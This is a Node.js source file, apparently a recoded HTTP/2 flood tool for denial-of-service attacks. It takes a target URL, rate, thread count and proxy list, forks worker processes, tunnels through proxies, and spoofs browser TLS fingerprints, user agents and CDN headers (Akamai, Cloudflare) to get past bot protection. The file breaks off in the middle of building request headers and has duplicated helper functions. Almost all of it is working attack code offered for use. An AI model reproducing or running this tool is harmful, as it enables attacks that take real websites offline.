// Code By @nguyenxuantrinhdz `Calce`
//recode by @ThaiDuongScript
// npm install colors
// Các thư viện cần thiết
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const colors = require('colors');
const v8 = require('v8');
const url = require("url");
const util = require('util');
const scp = require("set-cookie-parser");
const crypto = require("crypto");
const dns = require('dns');
const http = require('http');
const fs = require("fs");
const socks = require('socks').SocksClient;  // Thư viện để sử dụng SOCKS proxy
const HPACK = require('hpack');  // Thư viện để xử lý mã hóa HTTP/2 HPACK

// Import động `node-fetch`
let fetch;
(async () => {
    fetch = (await import('node-fetch')).default;
})();

// Các cấu hình cơ bản
const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const version = "111"; // Phiên bản trình duyệt giả định
const secChUaMobile = "1"; // 1 cho thiết bị di động, 0 cho desktop
const accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
const secFetchUser = "?1";
const acceptEncoding = "gzip, deflate, br";

const parsedProxy = ["127.0.0.1"]; // Thay bằng IP proxy của bạn hoặc loại bỏ nếu không cần

const secChUAFullVersionList = {
    brave: `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
    chrome: `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
    firefox: `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
    safari: `"Safari";v="${version}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
    mobile: `"Chromium";v="${version}", "Mobile";v="${version}", "Not-A.Brand";v="99"`,
    opera: `"Chromium";v="${version}", "Opera";v="${version}", "Not-A.Brand";v="99"`,
    operagx: `"Chromium";v="${version}", "Opera GX";v="${version}", "Not-A.Brand";v="99"`,
    edge: `"Chromium";v="${version}", "Microsoft Edge";v="${version}", "Not-A.Brand";v="99"`,
    ie: `"Internet Explorer";v="${version}"`
};

const userAgent = {
    brave: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Brave/111",
    chrome: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    firefox: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0",
    safari: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    mobile: "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
    opera: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/79.0.4143.72",
    operagx: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/79.0.4143.72 GX",
    edge: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.0.0",
    ie: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Trident/7.0; rv:11.0 like Gecko"
};

// Danh sách mã hóa cập nhật
const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
].join(':');

// Hàm tạo chuỗi ngẫu nhiên
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

// Hàm tạo số ngẫu nhiên trong khoảng cho trước
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Hàm tạo fingerprint JA3 cho TLS
function generateJA3Fingerprint(socket) {
    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();

    if (!cipherInfo) {
        console.error('Cipher info is not available. TLS handshake may not have completed.');
        return null;
    }

    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);
    return md5Hash.digest('hex');
}

const lookupPromise = util.promisify(dns.lookup);

let isp;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP', url + ':', isp);
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

// Hàm chọn phần tử ngẫu nhiên trong mảng
function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

// Phần còn lại của mã (giữ nguyên)
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.7,application/json;q=0.6',
    'application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.8,image/webp,image/apng,*/*;q=0.8,application/json;q=0.7',
];
const language_header = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'fr-FR,fr;q=0.9',
    'fr-CA,fr;q=0.8',
    'de-DE,de;q=0.9',
    'es-ES,es;q=0.9',
    'es-MX,es;q=0.8',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.8',
    'zh-CN,zh;q=0.9',
    'zh-TW,zh;q=0.8',
    'ja-JP,ja;q=0.9',
    'ko-KR,ko;q=0.9',
    'ru-RU,ru;q=0.9',
    'ar-SA,ar;q=0.9',
    'it-IT,it;q=0.9',
    'nl-NL,nl;q=0.9',
    'tr-TR,tr;q=0.9',
    'pl-PL,pl;q=0.9',
    'sv-SE,sv;q=0.9',
    'fi-FI,fi;q=0.9',
    'da-DK,da;q=0.8',
    'no-NO,no;q=0.8',
    'he-IL,he;q=0.8',
    'th-TH,th;q=0.8',
    'vi-VN,vi;q=0.8',
    'cs-CZ,cs;q=0.8',
    'hu-HU,hu;q=0.8',
    'el-GR,el;q=0.8',
    'uk-UA,uk;q=0.8',
    'id-ID,id;q=0.8',
    'ms-MY,ms;q=0.8',
    'bg-BG,bg;q=0.8',
    'ro-RO,ro;q=0.8',
    'sk-SK,sk;q=0.8',
    'sr-RS,sr;q=0.8',
    'sl-SI,sl;q=0.8',
    'lt-LT,lt;q=0.8',
    'lv-LV,lv;q=0.8',
    'et-EE,et;q=0.8',
    'is-IS,is;q=0.8',
    'hr-HR,hr;q=0.8',
];
const fetch_site = [
    "same-origin",
    "same-site",
    "cross-site",
    "none"
];
const fetch_mode = [
    "navigate",
    "same-origin",
    "no-cors",
    "cors"
];
const fetch_dest = [
    "document",
    "sharedworker",
    "subresource",
    "unknown",
    "worker"
];

// Cấu hình proxy và các thiết lập khác...
// Phần còn lại của mã giữ nguyên

process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_NO_TICKET |
crypto.constants.SSL_OP_NO_COMPRESSION |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_TLSEXT_PADDING |
crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt flood/bypass`); process.exit();}
 const secureProtocol = "TLS_method";
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
     input: process.argv[7],
     ipversion: process.argv[8],
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);







const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;
colors.enable();
const coloredString = "Recommended big proxyfile if hard target.\n >  Only support HTTP/2.\n >  Use low thread(s) if you don't want crash your server.".white;
if (cluster.isMaster) {
    console.clear()
    console.log(`[!] Flood`.red);
    console.log(`--------------------------------------------`.gray);
    console.log("[>] Heap Size:".green, (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toString().yellow);
    console.log('[>] Target: '.yellow + process.argv[2].cyan);
    console.log('[>] Time: '.magenta + process.argv[3].cyan);
    console.log('[>] Rate: '.blue + process.argv[4].cyan);
    console.log('[>] Thread(s): '.red + process.argv[5].cyan);
    console.log(`[>] ProxyFile: ${args.proxyFile.cyan} | Total: ${proxies.length.toString().cyan}`);
    console.log('[>] Mode: '.green + process.argv[7].cyan);
    console.log("[>] Note: ".brightCyan + coloredString);
    console.log(`--------------------------------------------`.gray);
    getIPAndISP(targetURL);


    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads*10; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera"];
    
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

// Hàm lấy tiêu đề cho từng trình duyệt
function getHeaders(browser) {
    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.' + parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsedTarget.pathname,
            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "Pragma": "no-cache",
            "user-agent": userAgent.brave,
            "sec-fetch-user": secFetchUser,
            "accept-encoding": acceptEncoding,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.brave
        },
        chrome: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.' + parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsedTarget.pathname,
            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "Pragma": "no-cache",
            "user-agent": userAgent.chrome,
            "sec-fetch-user": secFetchUser,
            "accept-encoding": acceptEncoding,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.chrome
        },
        firefox: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.' + parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsedTarget.pathname,
            "sec-ch-ua": `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "Pragma": "no-cache",
            "user-agent": userAgent.firefox,
            "sec-fetch-user": secFetchUser,
            "accept-encoding": acceptEncoding,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.firefox
        },
        safari: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.' + parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsedTarget.pathname,
            "sec-ch-ua": `"Safari";v="${version}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "Pragma": "no-cache",
            "user-agent": userAgent.safari,
            "sec-fetch-user": secFetchUser,
            "accept-encoding": acceptEncoding,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.safari
        },
        mobile: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.' + parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsedTarget.pathname,
            "sec-ch-ua": `"Chromium";v="${version}", "Mobile";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "Pragma": "no-cache",
            "user-agent": userAgent.mobile,
            "sec-fetch-user": secFetchUser,
            "accept-encoding": acceptEncoding,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.mobile
        },
        opera: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.' + parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsedTarget.pathname,
            "sec-ch-ua": `"Chromium";v="${version}", "Opera";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "Pragma": "no-cache",
            "user-agent": userAgent.opera,
            "sec-fetch-user": secFetchUser,
            "accept-encoding": acceptEncoding,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.opera
        },
        operagx: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.' + parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsedTarget.pathname,
            "sec-ch-ua": `"Chromium";v="${version}", "Opera GX";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "Pragma": "no-cache",
            "user-agent": userAgent.operagx,
            "sec-fetch-user": secFetchUser,
            "accept-encoding": acceptEncoding,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.operagx
        },
        edge: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : ('www.' + parsedTarget.host),
            ":scheme": "https",
            ":path": parsedTarget.pathname,
            "sec-ch-ua": `"Chromium";v="${version}", "Microsoft Edge";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "Pragma": "no-cache",
            "user-agent": userAgent.edge,
            "sec-fetch-user": secFetchUser,
            "accept-encoding": acceptEncoding,
            "accept-language": "en-US,en;q=0.9",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.edge
        },
        ie: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : ('www.' + parsedTarget.host),
            ":scheme": "https",
            ":path": parsedTarget.pathname,
            "sec-ch-ua": `"Internet Explorer";v="${version}"`,
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "Pragma": "no-cache",
            "user-agent": userAgent.ie,
            "sec-fetch-user": secFetchUser,
            "accept-encoding": acceptEncoding,
            "accept-language": "en-US,en;q=0.9",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.ie
        }
    };

    return headersMap[browser];
}

// Ví dụ sử dụng hàm getHeaders
const headers = getHeaders('chrome'); // Lấy tiêu đề cho Chrome
console.log(headers);

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// Hàm tạo chuỗi ngẫu nhiên theo định dạng cụ thể
function generateRandomString(min, max) {
    const length = Math.floor(Math.random() * (max - min + 1)) + min;
    return randstr(length);
}

// Các cấu hình tiêu đề bổ sung
const randomString = randstr(10);

const rateHeaders1 = [
    { "X-Forwarded-For": parsedProxy[0] },
    { "source-ip": randstr(5) },
    { "Vary": randstr(5) },
    { "Attribution-Reporting-Eligible": "trigger" }
];

const rateHeaders2 = [
    { "TTL-3": "1.5" },
    { "From-Unknown-Botnet": "Crisx12012" }
];

const rateHeaders3 = [
    { "A-IM": "Feed" },
    { "dnt": 1 },
    { "content-security-policy-report-only": "report-uri https://reporting.go-mpulse.net/report/FDSGP-LEB9B-T8Y2A-5V5ED-9WX2T" }
];

const rateHeaders4 = [
    { "Service-Worker-Navigation-Preload": "true" },
    { "Supports-Loading-Mode": "credentialed-prerender" },
    { "pragma": "no-cache" },
    { "data-return": "false" }
];

const rhd = [
    { "RTT": Math.floor(Math.random() * (600 - 400 + 1)) + 400 },
    { "X-Forwarded-Proto": "https" },
    { "Nel": '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }' }
];

const hd1 = [
    { "Accept-Range": Math.random() < 0.5 ? "bytes" : "none" },
    { "Delta-Base": "12340001" },
    { "te": "trailers" }
];

const clength = randstr(10); // Tạo chuỗi ngẫu nhiên dài 10 ký tự

const headers4 = {
   ...(Math.random() < 0.5 ? { "akamai-grn": "0.14965468.1718719936.1009b53" } : {}),
   ...(Math.random() < 0.5 ? { "x-akam-sw-version": "0.5.0" } : {}),
   ...(Math.random() < 0.5 ? { "x-akamai-transformed": "9 - 0 pmb=mNONE,1mTOE,1mRUM,4" } : {}),
   ...(Math.random() < 0.4 ? { "x-forwarded-for": `${randomString}:${randomString}` } : {}),
   ...(Math.random() < 0.75 ? { "referer": "https:/" + clength } : {}), 
   ...(Math.random() < 0.75 ? { "origin": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randstr(4) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? "root-admin." : "root-root.") + clength } : {})
};

// Gộp các tiêu đề lại với nhau
let allHeaders = Object.assign({}, headers, headers4);

const dyn = {
    ...(Math.random() < 0.5 ? { "cf-mitigated": "challenge" } : {}),
    ...(Math.random() < 0.5 ? { "origin-agent-cluster": "?1" } : {}),
    ...(Math.random() < 0.5 ? { "Observe-Browsing-Topics": "?1" } : {}),
    ...(Math.random() < 0.5 ? { ["client-x-with-" + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
    ...(Math.random() < 0.5 ? { ["cf-sec-with-from-" + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
    ...(Math.random() < 0.5 ? { ["user-x-with-" + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
    ["nodejs-c-python-" + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12)
};

const dyn2 = {
    ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
    ...(Math.random() < 0.5 ? { "purpose": "prefetch" } : {})
};

// Ví dụ sử dụng allHeaders với các tiêu đề đã hợp nhất
console.log(allHeaders);
console.log(dyn);
console.log(dyn2);

const rateHeaders = [
    { "X-Forwarded-For": parsedProxy[0] }, // Sử dụng parsedProxy hoặc loại bỏ nếu không cần
    { "source-ip": randstr(5) },
    { "Vary": randstr(5) },
    { "Attribution-Reporting-Eligible": "trigger" }
];

     const browserVersion = getRandomInt(125,130);
    const fwfw = ['Google Chrome'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    let brandValue;
    if (browserVersion === 125) {
        brandValue = `"Not_A Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 126) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 127) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 128) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 129) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 130) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }

const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
   'Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
   'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/112.0.0.0 Safari/537.36',
   'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
   'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/114.0.0.0 Safari/537.36',
];

const secChUa = userAgents[Math.floor(Math.random() * userAgents.length)];
const u = [
   userAgents[Math.floor(Math.random() * userAgents.length)],
   userAgents[Math.floor(Math.random() * userAgents.length)],
   userAgents[Math.floor(Math.random() * userAgents.length)],
   userAgents[Math.floor(Math.random() * userAgents.length)],
   userAgents[Math.floor(Math.random() * userAgents.length)],
   userAgents[Math.floor(Math.random() * userAgents.length)],
   userAgents[Math.floor(Math.random() * userAgents.length)],
];

function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }
 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    let interval
    	if (args.input === 'flood') {
	  interval = 700;
	} 
  else if (args.input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  

	  interval = randomDelay(700, 7000);
	} else {
	  process.stdout.write('default : flood\r');
	  interval = 1000;
	}
  
  
  encoding_header = [
    'gzip, deflate, br'
    , 'compress, gzip'
    , 'deflate, gzip'
    , 'gzip, identity'
  ];

  function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}


 
     const rateHeaders = [
  { "akamai-origin-hop": randstr(12) },
  { "proxy-client-ip": randstr(12) },
  { "via": randstr(12) },
  { "cluster-ip": randstr(12) },
        ];
        const rateHeaders2 = [
        { "dnt": "1"  },
        { "origin": "https://" + parsedTarget.host  },
        { "referer": "https://" + parsedTarget.host + "/" },
        {"accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
        ];

let headers = {
  ":authority": parsedTarget.host,
  ":method": "GET",
  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
  "Accept" : accept_header[Math.floor(Math.random() * accept_header.length)],
  ":path": parsedTarget.path,
  ":scheme": "https",
